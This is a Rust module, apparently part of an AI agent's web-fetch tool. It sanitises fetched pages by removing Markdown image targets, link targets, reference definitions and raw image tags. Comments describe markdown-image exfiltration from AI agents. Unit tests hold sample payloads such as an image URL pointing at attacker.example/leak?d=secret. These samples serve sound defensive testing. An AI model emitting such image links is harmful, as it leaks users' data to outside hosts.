//! Serialize extracted content into clean, agent-safe text.
//!
//! Articles arrive as Markdown and plain-text fallbacks as text. Either way the
//! output has two deliberate properties:
//!
//! - **No image markup survives.** A fetched page is untrusted; a markdown
//!   image in it (`![](https://attacker/?data=…)`) is a known exfiltration
//!   channel once a client renders it. Link text is kept outside code, the URL
//!   is not.
//! - **Whitespace is normalized** so the model reads prose, not layout, except
//!   inside fenced code, where indentation is meaning.

/// One extracted page: the readable text plus the metadata a caller can cite.
#[derive(Debug, Clone, serde::Serialize)]
pub struct Page {
    pub title: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub byline: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub published: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub site: Option<String>,
    pub text: String,
    /// A client-side redirect target the caller may follow (after the guard);
    /// never serialized to a model, which should not be told to fetch it.
    #[serde(skip)]
    pub redirect: Option<String>,
}

impl Page {
    /// A page that is only text, such as a plain-text or PDF body.
    pub fn text(text: String) -> Self {
        Page {
            title: String::new(),
            byline: None,
            published: None,
            site: None,
            text,
            redirect: None,
        }
    }
}

/// Normalize plain text: collapse whitespace, keep at most one blank line
/// between paragraphs, and neutralize any residual link or image syntax.
pub(super) fn clean(text: &str) -> String {
    normalize(text, false)
}

/// Normalize Markdown from the article extractor. Headings, lists and code
/// keep their structure: fenced code keeps its indentation, inline code keeps
/// its characters, and punctuation escapes outside code are removed. Link
/// targets are dropped outside code, and image syntax is neutralized
/// everywhere, inside code too, so no reading of the output can autoload one.
pub(super) fn markdown(text: &str) -> String {
    normalize(text, true)
}

/// Neutralize active images in literal text without collapsing indentation or
/// rewriting code punctuation. Reference definitions are made non-resolving.
pub(super) fn safe_text(text: &str) -> String {
    // Reference labels may span lines. Scan each possible definition start,
    // then copy once so large documents do not repeatedly allocate suffixes.
    let mut breaks = Vec::new();
    let mut offset = 0;
    let mut scanned_until = 0;
    for line in text.split_inclusive('\n') {
        let body = line.trim_start_matches(|c: char| {
            c.is_whitespace()
                || matches!(c, '>' | '-' | '*' | '+' | '.' | ')')
                || c.is_ascii_digit()
        });
        if body.starts_with('[') {
            let start = offset + line.len() - body.len();
            if start >= scanned_until {
                if let Some(rest) = text.get(start..) {
                    scanned_until = text.len();
                    if let Some(close) = rest.find(']') {
                        scanned_until = start + close + 1;
                        if rest.as_bytes().get(close + 1) == Some(&b':') {
                            breaks.push(scanned_until);
                        }
                    }
                }
            }
        }
        offset += line.len();
    }
    let mut defused = String::with_capacity(text.len());
    let mut start = 0;
    for at in breaks {
        if let Some(part) = text.get(start..at) {
            defused.push_str(part);
            defused.push(' ');
            start = at;
        }
    }
    defused.push_str(text.get(start..).unwrap_or_default());
    let out = strip_targets(&defused, false);
    // Raw HTML image elements are active in many Markdown renderers, even when
    // the response was served as text/plain. Break only real image tag names.
    let mut safe = String::with_capacity(out.len());
    let mut chars = out.chars().peekable();
    while let Some(ch) = chars.next() {
        safe.push(ch);
        if ch == '<' {
            let mut look = chars.clone();
            let name: String = look
                .by_ref()
                .take(6)
                .take_while(char::is_ascii_alphabetic)
                .collect();
            let boundary = chars.clone().nth(name.chars().count());
            if matches!(name.to_ascii_lowercase().as_str(), "img" | "image")
                && boundary.is_some_and(|ch| ch.is_whitespace() || matches!(ch, '/' | '>'))
            {
                safe.push(' ');
            }
        }
    }
    safe
}

/// Shared line normalization for [`clean`] and [`markdown`].
fn normalize(text: &str, markdown: bool) -> String {
    let text = safe_text(text);
    let mut out = String::with_capacity(text.len());
    let mut blank = false;
    let mut fence: Option<char> = None;
    for raw in text.lines() {
        let raw = defuse_definition(raw);
        let trimmed = raw.trim();
        let fence_line = markdown && (trimmed.starts_with("```") || trimmed.starts_with("~~~"));
        if let Some(marker) = fence {
            out.push_str(&strip_targets(raw.trim_end(), false));
            out.push('\n');
            if fence_line && trimmed.chars().all(|c| c == marker) {
                fence = None;
            }
            blank = false;
            continue;
        }
        if fence_line {
            fence = trimmed.chars().next();
            out.push_str(&strip_targets(trimmed, false));
            out.push('\n');
            blank = false;
            continue;
        }
        let line = trimmed.split_whitespace().collect::<Vec<_>>().join(" ");
        let line = if markdown {
            strip_targets(&prose(&line), false)
        } else {
            strip_targets(&line, true)
        };
        // Sphinx and similar generators append a pilcrow permalink to headings.
        let line = line.trim_end_matches('¶').trim_end();
        if line.is_empty() {
            // At most one blank line between paragraphs.
            if !blank && !out.is_empty() {
                out.push('\n');
            }
            blank = true;
            continue;
        }
        blank = false;
        out.push_str(line);
        out.push('\n');
    }
    safe_text(out.trim())
}

/// Process one Markdown line outside fences: inline code spans are kept
/// verbatim; elsewhere escapes are removed first and then link and image
/// targets dropped, so an unescaped `\![x](y)` cannot become an image.
fn prose(line: &str) -> String {
    let mut out = String::with_capacity(line.len());
    for (code, segment) in code_spans(line) {
        if code {
            out.push_str(segment);
        } else {
            out.push_str(&strip_targets(&unescape(segment), true));
        }
    }
    out
}

/// Split a line into `(is_code, text)` segments. A run of N backticks opens a
/// span closed by the next run of exactly N; an unmatched or backslash-escaped
/// run is literal text, as in CommonMark.
fn code_spans(line: &str) -> Vec<(bool, &str)> {
    let bytes = line.as_bytes();
    let run_at = |at: usize| bytes.iter().skip(at).take_while(|&&b| b == b'`').count();
    let mut segments = Vec::new();
    let mut start = 0;
    let mut at = 0;
    while at < bytes.len() {
        if bytes.get(at) != Some(&b'`') || (at > 0 && bytes.get(at - 1) == Some(&b'\\')) {
            at += 1;
            continue;
        }
        let run = run_at(at);
        let mut close = at + run;
        let mut found = None;
        while close < bytes.len() {
            if bytes.get(close) == Some(&b'`') {
                let length = run_at(close);
                if length == run {
                    found = Some(close);
                    break;
                }
                close += length;
            } else {
                close += 1;
            }
        }
        match found {
            Some(end) => {
                if let Some(before) = line.get(start..at) {
                    segments.push((false, before));
                }
                if let Some(code) = line.get(at..end + run) {
                    segments.push((true, code));
                }
                start = end + run;
                at = start;
            }
            None => at += run,
        }
    }
    if let Some(rest) = line.get(start..) {
        segments.push((false, rest));
    }
    segments
}

/// Remove Markdown backslash escapes before ASCII punctuation.
fn unescape(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    let mut chars = text.chars().peekable();
    while let Some(ch) = chars.next() {
        if ch == '\\' && chars.peek().is_some_and(char::is_ascii_punctuation) {
            continue;
        }
        out.push(ch);
    }
    out
}

/// Remove Markdown image targets, and link targets when `links` is set,
/// keeping the human text. This is the exfiltration guard: page content must
/// not be able to carry an image a client would fetch on the model's behalf.
///
/// One pass with an explicit bracket stack, so nested forms such as the badge
/// pattern `[![alt](image)](link)` lose their inner image before the outer link
/// is considered, and deep nesting cannot exhaust the call stack. Brackets that
/// are not followed by `(target)` stay literal (`vec![1]`, `a[0]`); reference
/// images cannot resolve because [`defuse_definition`] breaks every definition.
fn strip_targets(text: &str, links: bool) -> String {
    /// An open `[`: where its opener starts in `out`, and whether it is `![`.
    struct Open {
        at: usize,
        image: bool,
    }
    let mut out = String::with_capacity(text.len());
    let mut open: Vec<Open> = Vec::new();
    let mut chars = text.chars().peekable();
    while let Some(ch) = chars.next() {
        match ch {
            '[' => {
                let image = out.ends_with('!');
                let at = if image { out.len() - 1 } else { out.len() };
                open.push(Open { at, image });
                out.push('[');
            }
            ']' => {
                let Some(opened) = open.pop() else {
                    out.push(']');
                    continue;
                };
                if chars.peek() != Some(&'(') || !(opened.image || links) {
                    out.push(']');
                    continue;
                }
                // `[text](target)` or `![alt](target)`: drop the opener, the
                // closing bracket and the balanced target; keep the text.
                chars.next();
                let mut depth = 1usize;
                for c in chars.by_ref() {
                    match c {
                        '(' => depth += 1,
                        ')' => {
                            depth -= 1;
                            if depth == 0 {
                                break;
                            }
                        }
                        _ => {}
                    }
                }
                let opener = if opened.image { 2 } else { 1 };
                out.replace_range(opened.at..opened.at + opener, "");
            }
            c => out.push(c),
        }
    }
    out
}

/// Break a Markdown link reference definition (`[label]: url`, possibly inside
/// quote or list markers) by separating the colon, so no reference-style link
/// or image elsewhere in the page can resolve to a URL.
fn defuse_definition(line: &str) -> std::borrow::Cow<'_, str> {
    let body = line.trim_start_matches(|c: char| {
        c.is_whitespace() || matches!(c, '>' | '-' | '*' | '+' | '.' | ')') || c.is_ascii_digit()
    });
    if body.starts_with('[') {
        if let Some(close) = body.find("]:") {
            let at = line.len() - body.len() + close + 1;
            let mut defused = line.to_string();
            defused.insert(at, ' ');
            return std::borrow::Cow::Owned(defused);
        }
    }
    std::borrow::Cow::Borrowed(line)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Literal source text keeps indentation while active Markdown/HTML images
    /// and image reference definitions become non-loading text.
    #[test]
    fn literal_text_cannot_autoload_images_or_lose_code_layout() {
        let text = "    let x = vec![1];\n    ![pixel](https://example.com/pixel)\n<img src='https://example.com/pixel'>\n![badge][target]\n[target]: https://example.com/pixel\n<imgBuffer>";
        let safe = safe_text(text);
        assert!(safe.starts_with("    let x = vec![1];\n    pixel\n"));
        assert!(!safe.contains("![pixel]"));
        assert!(!safe.contains("<img "));
        assert!(safe.contains("< img src="));
        assert!(safe.contains("[target] :"));
        assert!(safe.ends_with("<imgBuffer>"));
    }

    /// CommonMark accepts newlines in image labels, destinations and references.
    #[test]
    fn multiline_images_and_reference_definitions_are_neutralized() {
        for input in [
            "before ![pixel\nlabel](https://example.com/pixel) after",
            "![pixel](\nhttps://example.com/pixel\n)",
        ] {
            for output in [safe_text(input), markdown(input), clean(input)] {
                assert!(!output.contains("!["), "{output:?}");
                assert!(!output.contains("https://example.com/pixel"), "{output:?}");
            }
        }
        let input = "![label][multi\nline]\n[multi\nline]: https://example.com/pixel";
        for output in [safe_text(input), markdown(input), clean(input)] {
            assert!(output.contains("line] :"), "{output:?}");
        }
        assert_eq!(
            markdown("```html\n<img src='pixel'>\n```"),
            "```html\n< img src='pixel'>\n```"
        );
    }

    #[test]
    fn whitespace_is_collapsed_and_paragraphs_keep_one_blank_line() {
        // Runs of spaces collapse; runs of blank lines become exactly one.
        assert_eq!(clean("a   b\n\n\n\nc"), "a b\n\nc");
        assert_eq!(clean("only   line"), "only line");
        assert_eq!(clean("  \n\n  "), "");
    }

    #[test]
    fn markdown_images_are_removed_and_links_reduced_to_text() {
        assert_eq!(
            clean("see [the docs](https://x.example/a) now"),
            "see the docs now"
        );
        assert_eq!(
            clean("logo ![x](https://attacker.example/leak?d=secret) here"),
            "logo x here"
        );
    }

    #[test]
    fn bare_urls_survive_as_text() {
        // A bare URL does not autoload; keeping it is useful and safe.
        assert_eq!(
            clean("read https://example.com/x"),
            "read https://example.com/x"
        );
    }

    #[test]
    fn literal_brackets_preserve_code_and_non_link_text() {
        assert_eq!(clean("s1[0] and values[index]"), "s1[0] and values[index]");
        assert_eq!(
            clean("[nested [label]] ![literal] [unfinished"),
            "[nested [label]] ![literal] [unfinished"
        );
        assert_eq!(
            markdown("```\n#![allow(unused)]\nlet v = vec![1, 2];\n```"),
            "```\n#![allow(unused)]\nlet v = vec![1, 2];\n```"
        );
    }

    #[test]
    /// Reference images stay literal because every definition is broken, in
    /// plain text, Markdown, quotes and lists alike.
    fn reference_definitions_are_broken() {
        assert_eq!(
            clean("![pixel][target]\n[target]: https://attacker.example/pixel"),
            "![pixel][target]\n[target] : https://attacker.example/pixel"
        );
        for line in [
            "  [t]: https://a.example/x",
            "> [t]: https://a.example/x",
            "- [t]: <https://a.example/x>",
        ] {
            assert!(markdown(line).contains("] :"), "{line}");
        }
    }

    /// Images nested in links or brackets — the README badge pattern — and
    /// pathological nesting are neutralized without recursion.
    #[test]
    fn nested_images_are_neutralized() {
        assert_eq!(
            markdown("[![build](https://img.example/badge.svg)](https://ci.example) and [![a](https://evil.example)]"),
            "build and [a]"
        );
        let deep = format!(
            "{}![x](https://evil.example){}",
            "[".repeat(100_000),
            "]".repeat(100_000)
        );
        assert!(!markdown(&deep).contains("]("));
    }

    /// Fenced code keeps indentation and literal brackets; prose loses escapes.
    #[test]
    fn markdown_code_keeps_its_shape() {
        let input = "## 4\\.1\\. `if` Statements¶\n\n```\nfor x in xs:\n    call(a[0](x))\n```\n\nUse `a[0](x)` \\(see [docs](https://example.com)\\)\\.";
        assert_eq!(
            markdown(input),
            "## 4.1. `if` Statements\n\n```\nfor x in xs:\n    call(a[0](x))\n```\n\nUse `a[0](x)` (see docs)."
        );
    }

    /// Images are neutralized in code and after unescaping, and an escaped or
    /// unmatched backtick cannot hide one inside a fake code span.
    #[test]
    fn markdown_images_never_survive() {
        for input in [
            "```\n![x](https://attacker.example/a)\n```",
            "`![x](https://attacker.example/b)`",
            "\\![x\\](https://attacker.example/c)",
            "\\`x ![y](https://attacker.example/d) `",
            "`x ![y](https://attacker.example/e)",
        ] {
            let output = markdown(input);
            assert!(!output.contains("]("), "{input:?} -> {output:?}");
        }
    }
}
